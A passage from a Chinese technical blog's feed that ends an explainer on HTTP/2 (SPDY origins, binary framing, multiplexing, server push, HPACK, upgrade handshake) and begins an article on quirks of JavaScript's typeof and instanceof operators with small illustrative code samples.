历史及其与 SPDY 的渊源</h2><blockquote><p>SPDY 是谷歌开发的一个实验性协议，于 2009 年年中发布，主要目标是通过解决 HTTP 1.1 中广为人知的一些性能限制，来减少网页的加载延迟</p></blockquote><h3 id="SPDY-协议设定的目标"><a href="#SPDY-协议设定的目标" class="headerlink" title="SPDY 协议设定的目标"></a>SPDY 协议设定的目标</h3><ul><li>页面加载时间（PLT，Page • Load Time）降低 50%；</li><li>无需网站作者修改任何内容；</li><li>把部署复杂性降至最低，无需变更网络基础设施；</li><li>与开源社区合作开发这个新协议；</li><li><p>收集真实性能数据，验证这个实验性协议是否有效。</p><p><img src="https://raw.githubusercontent.com/zqjflash/http2-protocol/master/binary-frame-layout.png" alt="Alt text"></p></li></ul><h3 id="注：为了达到降低-50-页面加载时间的目标，SPDY-引入了一个新的二进制分帧数据层，以实现多向请求和响应、优先次序、最小化及消除不必要的网络延迟，目的是更有效地利用底层-TCP-连接；"><a href="#注：为了达到降低-50-页面加载时间的目标，SPDY-引入了一个新的二进制分帧数据层，以实现多向请求和响应、优先次序、最小化及消除不必要的网络延迟，目的是更有效地利用底层-TCP-连接；" class="headerlink" title="注：为了达到降低 50% 页面加载时间的目标，SPDY 引入了一个新的二进制分帧数据层，以实现多向请求和响应、优先次序、最小化及消除不必要的网络延迟，目的是更有效地利用底层 TCP 连接；"></a>注：为了达到降低 50% 页面加载时间的目标，SPDY 引入了一个新的二进制分帧数据层，以实现多向请求和响应、优先次序、最小化及消除不必要的网络延迟，目的是更有效地利用底层 TCP 连接；</h3><h3 id="HTTP-WG（HTTP-Working-Group）在-2012-年初把-HTTP-2-0-提到了议事日程，吸取-SPDY-的经验教训，并在此基础上制定官方标准"><a href="#HTTP-WG（HTTP-Working-Group）在-2012-年初把-HTTP-2-0-提到了议事日程，吸取-SPDY-的经验教训，并在此基础上制定官方标准" class="headerlink" title="HTTP-WG（HTTP Working Group）在 2012 年初把 HTTP 2.0 提到了议事日程，吸取 SPDY 的经验教训，并在此基础上制定官方标准"></a>HTTP-WG（HTTP Working Group）在 2012 年初把 HTTP 2.0 提到了议事日程，吸取 SPDY 的经验教训，并在此基础上制定官方标准</h3><h2 id="三、HTTP2-0-深入探究"><a href="#三、HTTP2-0-深入探究" class="headerlink" title="三、HTTP2.0 深入探究"></a>三、HTTP2.0 深入探究</h2><blockquote><p>HTTP/2.0 应该满足如下条件：</p></blockquote><ul><li>相对于使用 TCP 的 HTTP 1.1，• 用户在大多数情况下的感知延迟要有实质上、可度量的改进；</li><li>解决 HTTP 中的 “队首阻塞” 问题；</li><li>并行操作无需与服务器建立多个连接，从而改进 TCP 的利用率，特别是拥塞控制方面；</li><li>保持 HTTP 1.1 的语义，利用现有文档，包括（但不限于）HTTP 方法、状态码、URI，以及首部字段；</li><li>明确规定 HTTP 2.0 如何与 HTTP 1.x 互操作，特别是在中间介质上；</li><li>明确指出所有新的可扩展机制以及适当的扩展策略。</li></ul><h3 id="HTTP-2-0-致力于突破上一代标准众所周知的性能限制，但它也是对之前-1-x-标准的扩展，而非替代。之所以要递增一个大版本到-2-0，主要是因为它改变了客户端与服务器之间交换数据的方式，HTTP-2-0-增加了新的二进制分帧数据层"><a href="#HTTP-2-0-致力于突破上一代标准众所周知的性能限制，但它也是对之前-1-x-标准的扩展，而非替代。之所以要递增一个大版本到-2-0，主要是因为它改变了客户端与服务器之间交换数据的方式，HTTP-2-0-增加了新的二进制分帧数据层" class="headerlink" title="HTTP 2.0 致力于突破上一代标准众所周知的性能限制，但它也是对之前 1.x 标准的扩展，而非替代。之所以要递增一个大版本到 2.0，主要是因为它改变了客户端与服务器之间交换数据的方式，HTTP 2.0 增加了新的二进制分帧数据层"></a>HTTP 2.0 致力于突破上一代标准众所周知的性能限制，但它也是对之前 1.x 标准的扩展，而非替代。之所以要递增一个大版本到 2.0，主要是因为它改变了客户端与服务器之间交换数据的方式，HTTP 2.0 增加了新的二进制分帧数据层</h3><h2 id="四、HTTP2-0-设计和技术目标"><a href="#四、HTTP2-0-设计和技术目标" class="headerlink" title="四、HTTP2.0 设计和技术目标"></a>四、HTTP2.0 设计和技术目标</h2><blockquote><p>HTTP/2.0 通过支持首部字段压缩和在同一连接上发送多个并发消息，让应用更有效地利用网络资源，减少感知的延迟时间。而且，它还支持服务器到客户端的主动推送机制。</p></blockquote><ul><li><p>二进制分帧层</p><ul><li>HTTP 2.0 二进制分帧层，封装 HTTP 消息并在客户端与服务器之间传输</li></ul><p><img src="https://raw.githubusercontent.com/zqjflash/http2-protocol/master/binary-frame-layout.png" alt="Alt text"></p><ul><li><p>HTTP2.0 将所有传输的信息分割为更小的消息和帧，并对它们采用二进制格式的编码。</p></li><li><p>注：HTTPS 是二进制分帧的另一个典型示例：所有 HTTP 消息都以透明的方式为我们编码和解码，不必对应用进行任何修改。HTTP2.0 工作原理有点类似</p></li></ul></li><li><p>流、消息和帧</p><ul><li>流：流是连接中的一个虚拟信道，可以承载双向的消息；每个流都有一个唯一的整数标识符（1、2…N）；</li><li>消息：是指逻辑上的 HTTP 消息，比如请求、响应等，由一或多个帧组成。</li><li>帧：HTTP 2.0 通信的最小单位，每个帧包含帧首部，至少也会标识出当前帧所属的流，承载着特定类型的数据，如 HTTP 首部、负荷，等等</li></ul><p><img src="https://raw.githubusercontent.com/zqjflash/http2-protocol/master/http2-connect-stream.png" alt="Alt text"></p><ul><li>HTTP 2.0 的所有帧都采用二进制编码，所有首部数据都会被压缩。</li><li>所有通信都在一个 TCP 连接上完成。</li><li>HTTP 2.0 把 HTTP 协议通信的基本单位缩小为一个一个的帧，这些帧对应着逻辑流中的消息。相应地，很多流可以并行地在同一个 TCP 连接上交换消息</li></ul></li><li><p>多向请求与响应</p><ul><li><p>HTTP 2.0 中新的二进制分帧层突破了这些限制，实现了多向请求和响应：客户端和服务器可以把 HTTP 消息分解为互不依赖的帧，然后乱序发送，最后再在另一端把它们重新组合起来</p><p><img src="https://raw.githubusercontent.com/zqjflash/http2-protocol/master/http2-request-more.png" alt="Alt text"></p></li><li><p>图中包含了同一个连接上多个传输中的数据流：客户端正在向服务器传输一个 DATA 帧（stream 5），与此同时，服务器正向客户端乱序发送 stream 1 和 stream 3 的一系列帧。此时，一个连接上有 3 个请求 / 响应并行交换！</p></li><li><p>把 HTTP 消息分解为独立的帧，交错发送，然后在另一端重新组装是 HTTP 2.0 最重要的一项增强。这个机制会在整个 Web 技术栈中引发一系列连锁反应，从而带来巨大的性能提升。</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 可以并行交错地发送请求，请求之间互不影响；</span><br><span class="line">* 可以并行交错地发送响应，响应之间互不干扰；</span><br><span class="line">* 只使用一个连接即可并行发送多个请求和响应；</span><br><span class="line">* 消除不必要的延迟，从而减少页面加载的时间；</span><br><span class="line">* 不必再为绕过 HTTP 1.x 限制而多做很多工作；</span><br></pre></td></tr></table></figure><ul><li>HTTP 2.0 的二进制分帧机制解决了 HTTP 1.x 中存在的队首阻塞问题，也消除了并行处理和发送请求及响应时对多个连接的依赖。</li></ul></li><li><p>请求优先级</p><ul><li>把 HTTP 消息分解为很多独立的帧之后，就可以通过优化这些帧的交错和传输顺序，每个流都可以带有一个 31 比特的优先值：0 表示最高优先级；2 的 31 次方 - 1 表示最低优先级。</li><li>服务器可以根据流的优先级，控制资源分配（CPU、内存、带宽），而在响应数据准备好之后，优先将最高优先级的帧发送给客户端。</li><li>HTTP 2.0 一举解决了所有这些低效的问题：浏览器可以在发现资源时立即分派请求，指定每个流的优先级，让服务器决定最优的响应次序。这样请求就不必排队了，既节省了时间，也最大限度地利用了每个连接。</li></ul></li><li><p>每个来源一个连接</p><ul><li>有了新的分帧机制后，HTTP 2.0 不再依赖多个 TCP 连接去实现多流并行了。每个数据流都拆分成很多帧，而这些帧可以交错，还可以分别优先级。HTTP 2.0 连接都是持久化的，而且客户端与服务器之间也只需要一个连接即可。<ul><li>实验表明，客户端使用更少的连接肯定可以降低延迟时间。HTTP 2.0 发送的总分组数量比 HTTP 差不多要少 40%。</li><li>大多数 HTTP 连接的时间都很短，而且是突发性的，但 TCP 只在长时间连接传输大块数据时效率才最高。HTTP 2.0 通过让所有数据流共用同一个连接，可以更有效地使用 TCP 连接。</li></ul></li></ul></li><li><p>流量控制</p><ul><li>HTTP 2.0 为数据流和连接的流量控制提供了一个简单的机制：<ul><li>流量控制基于每一跳进行，而非端到端的控制；</li><li>流量控制基于窗口更新帧进行，即接收方广播自己准备接收某个数据流的多少字节，以及对整个连接要接收多少字节；</li><li>流量控制窗口大小通过 WINDOW_UPDATE 帧更新，这个字段指定了流 ID 和窗口大小递增值；</li><li>流量控制有方向性，即接收方可能根据自己的情况为每个流乃至整个连接设置任意窗口大小；</li><li>流量控制可以由接收方禁用，包括针对个别的流和针对整个连接。</li></ul></li></ul></li><li><p>服务器推送</p><ul><li><p>HTTP 2.0 新增的一个强大的新功能，就是服务器可以对一个客户端请求发送多个响应。服务器向客户端推送资源无需客户端明确地请求。</p><p><img src="https://raw.githubusercontent.com/zqjflash/http2-protocol/master/http2-server-push.png" alt="Alt text"></p></li><li><p>HTTP 2.0 连接后，客户端与服务器交换 SETTINGS 帧，借此可以限定双向并发的流的最大数量。因此，客户端可以限定推送流的数量，或者通过把这个值设置为 0 而完全禁用服务器推送。</p></li><li><p>所有推送的资源都遵守同源策略。换句话说，服务器不能随便将第三方资源推送给客户端，而必须是经过双方确认才行。</p></li><li><p>PUSH_PROMISE：所有服务器推送流都由 PUSH_PROMISE 发端，服务器向客户端发出的有意推送所述资源的信号。客户端接收到 PUSH_PROMISE 帧之后，可以视自身需求选择拒绝这个流</p></li><li><p>几点限制：</p><ul><li>服务器必须遵循请求 - 响应的循环，只能借着对请求的响应推送资源</li><li>PUSH_PROMISE 帧必须在返回响应之前发送，以免客户端出现竞态条件。</li></ul></li></ul></li><li><p>首部压缩（HPACK 压缩算法，一边用 index mapping table 压缩，一边编码，这个 table 由静态表和动态表组成）</p><ul><li><p>http2.0 会压缩首部元数据：在客户端和服务器端使用 “首部表” 来跟踪和存储之前发送的键值对，对于相同的数据，不再通过每次请求和响应发送；“首部表”在 http2.0 的连接存续期内始终存在，由客户端和服务器共同渐进地更新；每个新的首部键值对要么追加到当前表的末尾，要么替换表中之前的值。</p></li><li><p>http2.0 首部差异化传输</p><p><img src="https://raw.githubusercontent.com/zqjflash/http2-protocol/master/http2-header-diff.png" alt="Alt text"></p><ul><li>请求与响应首部的定义在 HTTP2.0 中基本没有改变，只是所有首部键必须全部小写，而且请求行要独立为 :method、:scheme、:host、:path 这些键值对。</li></ul></li></ul></li><li><p>有效的 HTTP2.0 升级与发现</p><ul><li><p>大多数现代浏览器都内置有高效的后台升级机制，支持 HTTP2.0 的客户端在发起新请求之前，必须能发现服务器及所有中间设备是否支持 HTTP2.0 协议。有三种可能的情况：</p><ul><li>通过 TLS 和 ALPN 发起新的 HTTPS 连接；</li><li>根据之前的信息发起新的 HTTP 连接；</li><li>没有之前的信息而发起新的 HTTP 连接。</li></ul></li><li><p>HTTPS 协商过程中有一个环节会使用 ALPN（应用层协议协商）。减少网络延迟是 HTTP 2.0 的关键条件，因此在建立 HTTPS 连接时一定会用到 ALPN 协商。</p></li><li><p>通过常规非加密信道建立 HTTP2.0 连接需要多做一点工作。因为 HTTP1.0 和 HTTP2.0 都使用同一个端口（80），有没有服务器是否支持 HTTP2.0 的其他任何信息，此时客户端只能使用 HTTP Upgrade 机制通过协调确定适当的协议：</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Upgrade: HTTP/<span class="number">2.0</span> ➊</span><br><span class="line">HTTP2-Settings: (SETTINGS payload) ➋</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK ➌</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">101</span> Switching Protocols ➍</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➊ 发起带有 HTTP 2.0 Upgrade 首部的 HTTP 1.1 请求</span><br><span class="line">➋ HTTP/2.0 SETTINGS 净荷的 Base64 URL 编码</span><br><span class="line">➌ 服务器拒绝升级，通过 HTTP 1.1 返回响应</span><br><span class="line">➍ 服务器接受 HTTP 2.0 升级，切换到新分帧</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;HTTP-状态码&quot;&gt;&lt;a href=&quot;#HTTP-状态码&quot; class=&quot;headerlink&quot; title=&quot;HTTP 状态码&quot;&gt;&lt;/a&gt;HTTP 状态码&lt;/h1&gt;&lt;p&gt;HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP 状态码共分为 5 种类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1xx    信息，服务器收到请求，需要请求者继续执行操作&lt;/li&gt;
&lt;li&gt;2xx    成功，操作被成功接收并处理&lt;/li&gt;
&lt;li&gt;3xx    重定向，需要进一步的操作以完成请求&lt;/li&gt;
&lt;li&gt;4xx    客户端错误，请求包含语法错误或无法完成请求&lt;/li&gt;
&lt;li&gt;5xx    服务器错误，服务器在处理请求的过程中发生了错误&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="HTTP" scheme="https://hexo.bangz.me/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>细说 javascript 的数据类型</title>
    <link href="https://hexo.bangz.me/archives/data-types-designing-of-javascript.html"/>
    <id>https://hexo.bangz.me/archives/data-types-designing-of-javascript.html</id>
    <published>2018-06-14T04:00:26.000Z</published>
    <updated>2022-01-25T09:32:43.975Z</updated>
    
    <content type="html"><![CDATA[<p>现在出来写前端有一段时间了，现在来回头看看，当初大学刚学搞前端的时候，为了快速适应新的语言，直接看后面的内容去了，跳过了基本数据类型的介绍，想当然的觉得 javascript 的数据类型应该也跟其他弱类型语言差不了太多，从而忽略了基本数据类型上的细节。最近随着对 js 语言了解和应用的加深，发现 js 的基本数据类型里面真的大有文章，甚至有不少的语言设计缺陷在里面。所以我打算专门写一篇关于基本数据类型的文章，专门来谈谈 js 在基本数据类型上的这些设计和缺陷。<br><a id="more"></a></p><h1 id="1-javascript-的诞生背景"><a href="#1-javascript-的诞生背景" class="headerlink" title="1. javascript 的诞生背景"></a>1. javascript 的诞生背景</h1><p>要说 javascript 的设计缺陷，我觉得不得不先谈下 js 诞生的背景，据说 javascript 的作者 <a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E8%98%AD%E7%99%BB%C2%B7%E8%89%BE%E5%85%8B" rel="external nofollow noopener noreferrer" target="_blank">Brendan Eich</a> 在设计和实现它的时候，总共加起来居然只花了十天的时间。。。</p><p>想一想，咱一个项目周期一般都是一个月左右，而这位大佬只花了十天就是设计出了一门语言！也许这就是真大佬的实力吧。。。</p><p>有兴趣的可以看下 <a href="http://www.ruanyifeng.com/blog/2011/06/birth_of_javascript.html" rel="external nofollow noopener noreferrer" target="_blank">阮一峰的这篇文章</a> 了解一下。但也就是在这种高压，并要求苛刻的背景下，就算是大佬也无法避免地在语言设计上出现了一些缺陷错误，有些随着时间的推移，想改都已经改不掉了，因为一改就会所有网站的 js 代码都得跟着改，由于当今 web 网站体量极为庞大，这么做会得罪很多人，所以这些缺陷错误都慢慢地成为了历史遗留问题。</p><p>作为一个 js 程序员，必须时时刻刻都要清楚牢记这些缺陷，在写代码的时候要尽可能地随时避开这些坑，这样子我们才能写出更加健壮，稳定，不坑自己的代码。</p><h1 id="2-基础数据类型表"><a href="#2-基础数据类型表" class="headerlink" title="2. 基础数据类型表"></a>2. 基础数据类型表</h1><p>首先必须要明确的一点是 javascript 这门语言根据 <a href="https://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-data-types-and-values" rel="external nofollow noopener noreferrer" target="_blank">ECMAScript 2015</a> 标准的定义，只有 7 种数据类型，它们分别是：</p><ol><li>Number</li><li>Boolean</li><li>String</li><li>Symbol（ES2015 中加入）</li><li>Null</li><li>Undefined</li><li>Object</li></ol><p>其中原始 (Primitive) 数据类型为 <strong>Number</strong>, <strong>Boolean</strong>, <strong>String</strong>, <strong>Symbol</strong>, <strong>Null</strong>, <strong>Undefined</strong></p><p>而引用 (Reference) 数据类型为 <strong>Object</strong></p><p>其他什么 Array, Function, RegExp 等的都是 Object 的子类。</p><h1 id="3-typeof-操作符上的问题"><a href="#3-typeof-操作符上的问题" class="headerlink" title="3. typeof 操作符上的问题"></a>3. typeof 操作符上的问题</h1><p>我们先来看一个 <a href="https://www.ecma-international.org/ecma-262/6.0/#sec-typeof-operator" rel="external nofollow noopener noreferrer" target="_blank">ECMAScript 2015</a> 中规范的表格：</p><p><strong>Table 35 — typeof Operator Results</strong></p><table><thead><tr><th>Type of val</th><th>Result</th></tr></thead><tbody><tr><td>Undefined</td><td>“undefined”</td></tr><tr><td>Null</td><td>“object”</td></tr><tr><td>Boolean</td><td>“boolean”</td></tr><tr><td>Number</td><td>“number”</td></tr><tr><td>String</td><td>“string”</td></tr><tr><td>Symbol</td><td>“symbol”</td></tr><tr><td>Object (ordinary and does not implement [[Call]])</td><td>“object”</td></tr><tr><td>Object (standard exotic and does not implement [[Call]])</td><td>“object”</td></tr><tr><td>Object (implements [[Call]])</td><td>“function”</td></tr><tr><td>Object (non-standard exotic and does not implement [[Call]])</td><td>Implementation-defined. Must not be “undefined”, “boolean”, “function”, “number”, “symbol”, or “string”.</td></tr></tbody></table><p>这个表格第一眼看过去会发现规范中存在着至少两个问题：</p><h2 id="3-1-typeof-null-的值为-“object”"><a href="#3-1-typeof-null-的值为-“object”" class="headerlink" title="3.1. typeof null 的值为 “object”"></a>3.1. typeof null 的值为 “object”</h2><p>前面说好的 null 是单独的一种数据类型，为什么 typeof null 又返回了 “object” 呢？？？</p><p>这实在是太奇怪了，网上搜查了一番，看到了<a href="https://www.zhihu.com/question/21691758" rel="external nofollow noopener noreferrer" target="_blank">这个</a>。原来 typeof null 就是一个设计缺陷，把 null 设计成了 0x00 ，而用 typeof 去判断类型的时候，如果低三位都是 0 就返回 “object”；</p><blockquote><p>000: object. The data is a reference to an object.</p></blockquote><p>这个问题就是前面所说的无法修改的设计缺陷，返回错误也拿它没办法，用户体量实在太庞大了，曾经有提案 typeof null === ‘null’. 但提案被拒绝<br><a href="http://wiki.ecmascript.org/doku.php?id=harmony%3atypeof_null" rel="external nofollow noopener noreferrer" target="_blank">harmony:typeof_null [ES Wiki]</a></p><h2 id="3-2-为什么要多出个-“function”-类型出来"><a href="#3-2-为什么要多出个-“function”-类型出来" class="headerlink" title="3.2. 为什么要多出个 “function” 类型出来"></a>3.2. 为什么要多出个 “function” 类型出来</h2><p>难道函数也要单独算一种类型？这跟前面基本数据类型的定义又对不上了。</p><p>带着这个问题我又去搜了一圈，找到了这篇东西</p><p><a href="https://www.zhihu.com/question/24804474/answer/29040916" rel="external nofollow noopener noreferrer" target="_blank">JavaScript 里 Function 也算一种基本类型？</a></p><blockquote><p>如果抛开 typeof null 的谜题，那么剩下唯一不对应的地方，就是 function 被单列出来。我个人的看法，这是因为 function 确实很特殊，特殊到从实际应用场景考虑确实应该将其单独列出来。spec 没有将其单列，是因为它同样有所有其他 object 的特性——而按照我的看法（爱民应该也是这样的看法），这仅仅是因为当初 JS 是如此设计和实现的。如果当初 function 不是作为一种特殊 object 来实现的（这完全是可能的，而且其实这样做更清晰），spec 自然应该将其单列为类型之一。</p></blockquote><p>如果按照这个说法这么一看，function 就是因为它的特殊性被开了特例，所以 typeof 这个函数也并不是完全按照前面基本数据类型来的，另外规范里面还有一种区分普通对象的 exotic 对象，这种对象可以根据浏览器实现来控制 typeof 的返回值，所以 typeof 现在的返回值也不仅仅只有基本数据类型和 function 了。</p><p>作为 typeof 的使用者，对于 typeof 这个操作符还是应该记住这个规律：</p><ul><li>对于基本类型，除 null 以外，均可以返回正确的结果。</li><li>对于引用类型，除 function 以外，一律返回 object 类型。</li><li>对于 null ，返回 object 类型。</li><li>对于 function 返回  function 类型。</li></ul><h2 id="3-3-“number”-类型中的特殊值"><a href="#3-3-“number”-类型中的特殊值" class="headerlink" title="3.3. “number” 类型中的特殊值"></a>3.3. “number” 类型中的特殊值</h2><p>对于 NaN 和 Infinity 这两个特殊值，typeof 遇到他们都会返回 number</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">Infinity</span>   <span class="comment">// "number"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">NaN</span>        <span class="comment">// "number"</span></span><br></pre></td></tr></table></figure><p>Infinity 其实还好，但是 NaN(Not a Number)把它设计成 number 类型之后，使得有些时候用 typeof 在判断数字的时候不会达到我们想要的效果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> response = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> num = <span class="built_in">parseInt</span>(response.a)</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> num === <span class="string">'number'</span>) &#123;</span><br><span class="line">    num = num + <span class="number">10</span> <span class="comment">// 执行后 num 仍然是 NaN</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器下发的数据中，缺少了 response.a 的数值字段，如果没有提前对这个字段是否为空做判断，就会发生上面的情况，它一旦出现，有时候会非常难找原因，因为在编译的时候它也不会报错，开发者不容易发现这个问题。</p><p>在这里也顺带说下，其实判断一个值是否为数字的最好的办法是借助 isFinite 函数来进行判断，因为 isFinite 函数本身会把传入值转换为 number，所以还得提前再加一层判断：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isNumber</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> val === <span class="string">"number"</span> &amp;&amp; <span class="built_in">isFinite</span>(val)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="4-instanceof-操作符上的问题"><a href="#4-instanceof-操作符上的问题" class="headerlink" title="4. instanceof 操作符上的问题"></a>4. instanceof 操作符上的问题</h1><p>关于 instanceof 这个操作符，可以在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/instanceof" rel="external nofollow noopener noreferrer" target="_blank">MDN</a> 上看到它的定义：</p><blockquote><p>instanceof 运算符用来测试一个对象在其原型链中是否存在一个构造函数的 prototype 属性。</p></blockquote><p>从这个定义上可以看出，instanceof 操作符相当于在原型链上查找一个 constructor，如果这个 constructor 存在的话，该运算符返回 true， 否则返回 false。</p><p>举个例子：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">Dog.prototype = <span class="keyword">new</span> Animal();</span><br><span class="line">Dog.prototype.constructor = Dog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> adog = <span class="keyword">new</span> Dog();</span><br><span class="line"><span class="built_in">console</span>.log(adog <span class="keyword">instanceof</span> Dog);    <span class="comment">// 返回 true</span></span><br><span class="line"><span class="built_in">console</span>.log(adog <span class="keyword">instanceof</span> Animal);   <span class="comment">// 返回 true</span></span><br></pre></td></tr></table></figure></p><p>平时这样子正常使用它是感觉不出来有问题的，然而，当遇到下面这些情况的时候，就需要注意了。</p><h2 id="4-1-当页面中存在一个或多个-frame-的时候"><a href="#4-1-当页面中存在一个或多个-frame-的时候" class="headerlink" title="4.1. 当页面中存在一个或多个 frame 的时候"></a>4.1. 当页面中存在一个或多个 frame 的时候</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[] <span class="keyword">instanceof</span> <span class="built_in">window</span>.frames[<span class="number">0</span>].Array</span><br></pre></td></tr></table></figure><p>这个跨环境的判断会返回 false，因为 <code>Array.prototype !== window.frames[0].Array.prototype</code></p><p>这在跨 frame 传递数据对象的时候，需要注意的一个问题。</p><h2 id="4-2-一些相对特殊的判断"><a href="#4-2-一些相对特殊的判断" class="headerlink" title="4.2. 一些相对特殊的判断"></a>4.2. 一些相对特殊的判断</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span>    <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span> <span class="keyword">instanceof</span> <span class="built_in">Function</span>      <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span>    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">Dog <span class="keyword">instanceof</span> <span class="built_in">Object</span>     <span class="comment">// true</span></span><br><span class="line">Dog <span class="keyword">instanceof</span> <span class="built_in">Function</span>   <span class="comment">// true</span></span><br><span class="line">Dog <span class="keyword">instanceof</span> Dog    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span> <span class="keyword">instanceof</span> <span class="built_in">Number</span>    <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span> <span class="keyword">instanceof</span> <span class="built_in">Boolean</span>    <span class="comment">// false</span></span><br><span class="line"><span class="built_in">String</span> <span class="keyword">instanceof</span> <span class="built_in">String</span>    <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Symbol</span> <span class="keyword">instanceof</span> <span class="built_in">Symbol</span>    <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>虽然前面的规范表格里面有提到过，js 里的 Function 是一个实现了 [[call]] 方法的 Object，它具有 Object 对象的全部特性，也就是说，Function 是继承了 Object 对象的，所以 <code>Function instanceof Object</code> 不难理解。</p><p>但是 <code>Function instanceof Function</code> 和 <code>Object instanceof Object</code>，实在是比较容易懵，一开始我也没想明白为什么会这样，后来看到了 <a href="https://www.ibm.com/developerworks/cn/web/1306_jiangjj_jsinstanceof/index.html" rel="external nofollow noopener noreferrer" target="_blank">IBM 上的一篇文章</a>，里面对这个 instanceof 的执行过程做了一个模拟还原：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">instance_of</span>(<span class="params">L, R</span>) </span>&#123;<span class="comment">//L 表示左表达式，R 表示右表达式</span></span><br><span class="line"> <span class="keyword">var</span> O = R.prototype;<span class="comment">// 取 R 的显示原型</span></span><br><span class="line"> L = L.__proto__;<span class="comment">// 取 L 的隐式原型</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="literal">true</span>) &#123; </span><br><span class="line">   <span class="keyword">if</span> (L === <span class="literal">null</span>) </span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">   <span class="keyword">if</span> (O === L)<span class="comment">// 这里重点：当 O 严格等于 L 时，返回 true </span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">   L = L.__proto__; </span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，instanceof 操作符会在左边的表达式中递归地向上查找 __proto__ 属性值，这个 __proto__ 对应着规范上的 [[Prototype]] 属性，再来对应到我们现在的问题上，最关键的是这一段：</p><pre><code>清单 7. Object instanceof Object... L = ObjectL.__proto__ = Function.prototype</code></pre><p>等下，ObjectL.__proto__ 竟然是 Function.prototype ？？？</p><p>看到这里我才突然想起来，原来 Object 和 Function 他们本身都是作为函数来提供给用户调用的，所以他们必须是 Function，按照这个思路，<code>Object instanceof Object</code> 和 <code>Function instanceof Function</code> 返回 true 也就合情合理了。</p><p>而对于 <code>Dog instanceof Dog</code> 为什么返回 false，也是因为</p><pre><code>L = FooL.__proto__ = Function.prototype</code></pre><p>左侧表达式一开始就为 Function.prototype 